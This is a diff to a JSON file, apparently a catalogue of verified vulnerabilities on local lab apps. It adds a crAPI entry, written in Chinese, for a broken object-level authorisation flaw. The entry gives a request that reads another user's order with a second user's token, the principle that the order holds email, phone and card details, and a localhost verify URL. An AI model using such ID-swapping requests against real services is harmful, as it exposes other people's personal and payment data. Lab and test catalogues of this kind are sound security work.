@@ -10,5 +10,18 @@
       "url": "http://localhost:8084/xvwa/vulnerabilities/idor/?item=2",
       "match": "Americano"
     }
+  },
+  {
+    "id": "auto-20261030200911",
+    "context": "crAPI REST /workshop/api/shop/orders/{id} — 订单详情端点只按 order id 查库，不校验该订单是否属于当前 token 用户，导致 BOLA/对象级越权",
+    "reference_payload": "GET /workshop/api/shop/orders/6  (Authorization: Bearer <user2的token> 读取 user1 的订单6)",
+    "principle": "BOLA/对象级越权：改资源 ID 用他人 token 读，服务端不校验归属即返回他人订单(含邮箱/电话/卡号/持卡人) → 200 返回他人 PII",
+    "source": "crapi",
+    "verify_url": "http://localhost:8888/workshop/api/shop/orders/{payload}",
+    "evidence": {
+      "verify": "echo",
+      "url": "http://localhost:8888/workshop/api/shop/orders/{payload}",
+      "match": "user1@example.com"
+    }
   }
 ]
